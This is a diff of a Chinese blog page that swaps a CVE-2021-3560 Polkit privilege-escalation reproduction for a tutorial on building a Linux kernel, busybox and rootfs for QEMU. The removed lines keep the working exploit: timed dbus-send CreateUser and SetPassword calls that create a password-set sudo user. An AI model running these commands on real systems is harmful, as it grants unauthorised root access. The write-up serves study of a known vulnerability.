@@ -16,28 +16,24 @@
   <meta name="author" content="p1yang">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CVE-2021-3560 Polkit权限提升漏洞6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户 Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务  Polkit 则会根据特权进程提供的信息和权限配置文件进行认证 认证完成后将认证结果返回给特权进程 特权进程会根据认证结果来决定是否给非特权进程提供服">
+    <meta name="description" content="编译Linux内核 编译busybox 制作文件系统 制作根文件系统镜像文件 利用qemu运行linux内核  #下载需要的工具 sudo apt-get install libncurses5-dev flex libelf-dev libssl-dev qemu lzop  编译内核Index of &#x2F;sites&#x2F;ftp.kernel.org&#x2F;pub&#x2F;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2021-3560 Polkit权限提升漏洞复现">
-<meta property="og:url" content="http://example.com/article/86aaf27b.html">
+<meta property="og:title" content="linux系统编译-x86_64">
+<meta property="og:url" content="http://example.com/article/e55c327a.html">
 <meta property="og:site_name" content="p1yang">
-<meta property="og:description" content="CVE-2021-3560 Polkit权限提升漏洞6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户 Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务  Polkit 则会根据特权进程提供的信息和权限配置文件进行认证 认证完成后将认证结果返回给特权进程 特权进程会根据认证结果来决定是否给非特权进程提供服">
+<meta property="og:description" content="编译Linux内核 编译busybox 制作文件系统 制作根文件系统镜像文件 利用qemu运行linux内核  #下载需要的工具 sudo apt-get install libncurses5-dev flex libelf-dev libssl-dev qemu lzop  编译内核Index of &#x2F;sites&#x2F;ftp.kernel.org&#x2F;pub&#x2F;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png">
-<meta property="og:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png">
-<meta property="article:published_time" content="2021-08-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-07-20T09:57:32.000Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516104921933.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516111650942.png">
+<meta property="article:published_time" content="2023-02-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-06-01T01:56:00.771Z">
 <meta property="article:author" content="p1yang">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516104921933.png">
   
   
   
-  <title>CVE-2021-3560 Polkit权限提升漏洞复现 - p1yang</title>
+  <title>linux系统编译-x86_64 - p1yang</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CVE-2021-3560 Polkit权限提升漏洞复现"></span>
+            <span id="subtitle" data-typed-text="linux系统编译-x86_64"></span>
           
         </div>
 
@@ -213,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-08-06 00:00" pubdate>
-          August 6, 2021 am
+        <time datetime="2023-02-12 00:00" pubdate>
+          February 12, 2023 am
         </time>
       </span>
     
@@ -225,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k words
+          2.6k words
         
       </span>
     
@@ -236,7 +232,7 @@
         
         
         
-          18 mins
+          22 mins
         
       </span>
     
@@ -274,82 +270,143 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CVE-2021-3560 Polkit权限提升漏洞复现</h1>
+            <h1 style="display: none">linux系统编译-x86_64</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="CVE-2021-3560-Polkit权限提升漏洞"><a href="#CVE-2021-3560-Polkit权限提升漏洞" class="headerlink" title="CVE-2021-3560 Polkit权限提升漏洞"></a>CVE-2021-3560 Polkit权限提升漏洞</h1><p>6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户</p>
-<p>Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务</p>
+                <ol>
+<li>编译Linux内核</li>
+<li>编译busybox</li>
+<li>制作文件系统</li>
+<li>制作根文件系统镜像文件</li>
+<li>利用qemu运行linux内核</li>
+</ol>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#下载需要的工具</span>
+sudo apt-get install libncurses5-dev flex libelf-dev libssl-dev qemu lzop</code></pre></div>
+
+<h1 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h1><p><a target="_blank" rel="noopener" href="http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/">Index of &#x2F;sites&#x2F;ftp.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F; (sjtu.edu.cn)</a></p>
 <blockquote>
-<p>Polkit 则会根据特权进程提供的信息和权限配置文件进行认证</p>
-<p>认证完成后将认证结果返回给特权进程</p>
-<p>特权进程会根据认证结果来决定是否给非特权进程提供服务</p>
-<p>而我们在认证操作中断开连接，导致无法获取认证结果</p>
-<p>具体后边会详细分析</p>
+<p>这里选择版本，从1.0 到 6.0都可以下载，看具体要求</p>
+<p>这里是国内镜像站，源站为<a target="_blank" rel="noopener" href="https://kernel.org/">The Linux Kernel Archives</a></p>
 </blockquote>
-<p>由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境：ubuntu20.04  </p>
+<div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="language-bash">下载内核</span>
+wget http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v6.x/linux-6.1.tar.gz
+<span class="hljs-meta">#</span><span class="language-bash">解压内核</span>
+tar -vxf linux-6.1.tar.gz
+cd linux-6.1
+<span class="hljs-meta">#</span><span class="language-bash">指定架构</span>
+export ARCH=x86
+<span class="hljs-meta">#</span><span class="language-bash">配置board config</span>
+make x86_64_defconfig
+<span class="hljs-meta">#</span><span class="language-bash">配置内核</span>
+make menuconfig
+<span class="hljs-meta">#</span><span class="language-bash">编译</span>
+make -j8</code></pre></div>
+
 <blockquote>
-<p><a target="_blank" rel="noopener" href="http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso">http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso</a> </p>
+<p>如果要编译其他架构的需要配置工具链 </p>
 </blockquote>
-<p>ssh（ 在本地ssh下操作）</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> CROSS_COMPILE=</code></pre></div>
+
 <blockquote>
-<p>sudo apt install ssh</p>
-<p>sudo service ssh start</p>
-<p>ssh <a href="mailto:&#x75;&#x73;&#101;&#114;&#110;&#x61;&#109;&#x65;&#64;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;">&#x75;&#x73;&#101;&#114;&#110;&#x61;&#109;&#x65;&#64;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;</a></p>
+<p>配置</p>
 </blockquote>
-<p>具体为什么要用ssh，这里不做赘述，可以自行百度dbus</p>
-<p>dbus-send发送D-Bus消息的工具，主要用于测试</p>
-<p>可以通过dbus-send从命令行触发polkit</p>
-<p>通过dbus-send构造语句，来创建一个新用户</p>
+<div class="code-wrapper"><pre><code class="hljs bash">General setup  ---&gt;
+       ----&gt; [*] Initial RAM filesystem and RAM disk (initramfs/initrd) support
+    Device Drivers  ---&gt;
+       [*] Block devices  ---&gt;
+               &lt;*&gt;   RAM block device support
+               (65536) Default RAM disk size (kbytes)</code></pre></div>
+
 <blockquote>
-<p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1</p>
+<p>图形化配置内核，记得保存再退出</p>
+<p>make -j8 参数是多核编译，告诉编译器同时处理8个编译任务，能大大加快编译速度。</p>
 </blockquote>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png" srcset="/img/loading.gif" lazyload alt="image-20220402141819448"></p>
-<p>正常情况返回肯定是认证不通过的</p>
-<p>上面说了通过中断来实现认证通过</p>
-<p>所以继续构造语句</p>
-<blockquote>
-<p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $!</p>
-</blockquote>
-<p>这里是开始执行后0.009秒断开连接</p>
-<p>这里多久断开连接要看具体执行时间，可以在前面加time 测试</p>
-<p>我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间</p>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png" srcset="/img/loading.gif" lazyload alt="image-20220402141825690"></p>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png" srcset="/img/loading.gif" lazyload alt="image-20220402141832450"></p>
-<p>运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的</p>
-<p>然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限</p>
-<p>现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆</p>
-<p>继续构造语句来设置密码</p>
-<p><code>这里涉及到一个知识点，dbus接口设置密码需要通过散列值</code></p>
-<p>通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5)</p>
-<blockquote>
-<p>openssl passwd -5 password</p>
-<p>(这里password是个人需要设置的密码)</p>
-</blockquote>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png" srcset="/img/loading.gif" lazyload alt="image-20220402141841022"></p>
-<p>构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值)</p>
-<blockquote>
-<p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! </p>
-</blockquote>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png" srcset="/img/loading.gif" lazyload alt="image-20220402141847603"></p>
-<p>多试这个也需要多试几次</p>
-<p>成功之后可以登陆尝试</p>
-<p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png" srcset="/img/loading.gif" lazyload alt="image-20220402141854349"></p>
-<p>至此，复现结束！</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon</p>
-<p>dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon</p>
-<p>account-daemon收到请求后向poklit询问id为10的连接有没有权限</p>
-<p>poklit向dbus-daemon询问该连接的uid </p>
-<p>如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码</p>
-<p>以上步骤完成后</p>
-<p>poklit返回true给account-daemon</p>
-<p>account-daemon创建新用户</p>
-<p>但是！</p>
-<p>如果我们在<code>poklit向dbus-daemon询问该连接的uid</code>时断开，那这个连接就不存在</p>
-<p>不存在，就会返回错误</p>
-<p>而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权</p>
+<p>编译好长这样。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516104921933.png" srcset="/img/loading.gif" lazyload alt="image-20230516104921933"></p>
+<h1 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h1><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#下载</span>
+wget https://busybox.net/downloads/busybox-1.36.0.tar.bz2
+<span class="hljs-comment">#解压</span>
+tar -xvf busybox-1.36.0.tar.bz2
+<span class="hljs-built_in">cd</span> busybox-1.36.0
+<span class="hljs-comment">#配置 这里要配置静态文件 settings -&gt;  Build static binary (no shared libs)  </span>
+make menconfig
+<span class="hljs-comment">#编译</span>
+make &amp;&amp; make install</code></pre></div>
+
+<p>配置</p>
+<div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Busybox </span>Settings  ---&gt;
+      <span class="hljs-keyword">Build </span>Options  ---&gt;
+            [*] <span class="hljs-keyword">Build </span><span class="hljs-keyword">BusyBox </span>as a static <span class="hljs-keyword">binary </span>(no <span class="hljs-keyword">shared </span>libs)
+</code></pre></div>
+
+<p>编译好的busybox在_install 目录下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516111650942.png" srcset="/img/loading.gif" lazyload alt="image-20230516111650942"></p>
+<h1 id="制作文件系统"><a href="#制作文件系统" class="headerlink" title="制作文件系统"></a>制作文件系统</h1><p>直接在_install文件夹下补充必要文件夹</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> _install
+<span class="hljs-comment"># -p参数是确保存在</span>
+<span class="hljs-built_in">mkdir</span> -p etc dev mnt proc sys tmp proc sys 
+<span class="hljs-built_in">mkdir</span> -p etc/init.d/
+<span class="hljs-comment">#当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。</span>
+<span class="hljs-comment">#详情请看</span>
+vim etc/fstab
+  proc        /proc           proc         defaults        0        0
+  tmpfs       /tmp            tmpfs      defaults        0        0
+  sysfs       /sys            sysfs        defaults        0        0
+<span class="hljs-comment"># rcS是一个脚本文件，在inittab文件中本解析调用，用于配置Linux系统。</span>
+vim etc/init.d/rcS
+	<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;Welcome to linux&quot;</span>
+	/bin/mount -a
+  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;Remounting the root filesystem&quot;</span>
+  mount  -o  remount,rw  /
+  <span class="hljs-built_in">mkdir</span> -p /dev/pts
+  mount -t devpts devpts /dev/pts
+  <span class="hljs-built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug
+  mdev -s
+<span class="hljs-built_in">chmod</span> 755 etc/init.d/rcS
+<span class="hljs-comment"># inittab是Linux系统中的一个配置文件，它定义了系统启动时要执行的进程和服务</span>
+vim etc/inittab
+	::sysinit:/etc/init.d/rcS
+	::respawn:-/bin/sh
+	::askfirst:-/bin/sh
+	::ctrlaltdel:/bin/umount -a -r
+<span class="hljs-built_in">chmod</span> 755 etc/inittab
+<span class="hljs-built_in">cd</span> dev
+<span class="hljs-comment">#mknod 命令建立一个目录项和一个特殊文件的对应索引节点。</span>
+sudo <span class="hljs-built_in">mknod</span> console c 5 1
+sudo <span class="hljs-built_in">mknod</span> null c 1 3
+sudo <span class="hljs-built_in">mknod</span> tty1 c 4 1</code></pre></div>
+
+<h1 id="制作根文件系统镜像文件"><a href="#制作根文件系统镜像文件" class="headerlink" title="制作根文件系统镜像文件"></a>制作根文件系统镜像文件</h1><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#从上一步返回到busybox源码文件夹，_install的上层目录</span>
+<span class="hljs-comment">#创建一个32M的文件，内容全部填充为0。</span>
+<span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=./rootfs.ext3  bs=1M count=32
+<span class="hljs-comment">#格式化rootfs.ext3</span>
+mkfs.ext3 rootfs.ext3
+<span class="hljs-comment">#创建fs文件夹，将rootfs挂载到fs</span>
+<span class="hljs-built_in">mkdir</span> fs
+sudo mount -o loop rootfs.ext3 ./fs
+<span class="hljs-comment">#将_install放入fs</span>
+sudo <span class="hljs-built_in">cp</span> -rf ./_install/* ./fs
+<span class="hljs-comment">#卸载镜像文件</span>
+sudo umount ./fs
+<span class="hljs-comment">#打包镜像</span>
+gzip --best -c rootfs.ext3 &gt; rootfs.img.gz</code></pre></div>
+
+<p>这里提供了脚本，可以直接使用</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-built_in">rm</span> -rf rootfs.ext3
+<span class="hljs-built_in">rm</span> -rf fs
+<span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=./rootfs.ext3 bs=1M count=32
+mkfs.ext3 rootfs.ext3
+<span class="hljs-built_in">mkdir</span> fs
+mount -o loop rootfs.ext3 ./fs
+<span class="hljs-built_in">cp</span> -rf ./_install/* ./fs
+umount ./fs
+gzip --best -c rootfs.ext3 &gt; rootfs.img.gz</code></pre></div>
+
+<h1 id="使用qemu运行内核"><a href="#使用qemu运行内核" class="headerlink" title="使用qemu运行内核"></a>使用qemu运行内核</h1><div class="code-wrapper"><pre><code class="hljs bash">qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage -initrd ./busybox-1.30.0/rootfs.img.gz -append <span class="hljs-string">&quot;root=/dev/ram init=/linuxrc console=ttyS0&quot;</span> -serial file:output.txt -nographic</code></pre></div>
+
 
                 
               </div>
@@ -388,8 +445,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CVE-2021-3560 Polkit权限提升漏洞复现</div>
-      <div>http://example.com/article/86aaf27b.html</div>
+      <div>linux系统编译-x86_64</div>
+      <div>http://example.com/article/e55c327a.html</div>
     </div>
     <div class="license-meta">
       
@@ -401,7 +458,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 6, 2021</div>
+          <div>February 12, 2023</div>
         </div>
       
       
@@ -431,9 +488,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/article/6a1d16f9.html" title="MIPS指令集">
+                      <a href="/article/cb6e4f2f.html" title="tendaAC8">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">MIPS指令集</span>
+                        <span class="hidden-mobile">tendaAC8</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -441,8 +498,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/article/c85b8ed3.html" title="智能合约">
-                        <span class="hidden-mobile">智能合约</span>
+                      <a href="/article/c1329a38.html" title="每天一个漏洞系列">
+                        <span class="hidden-mobile">每天一个漏洞系列</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
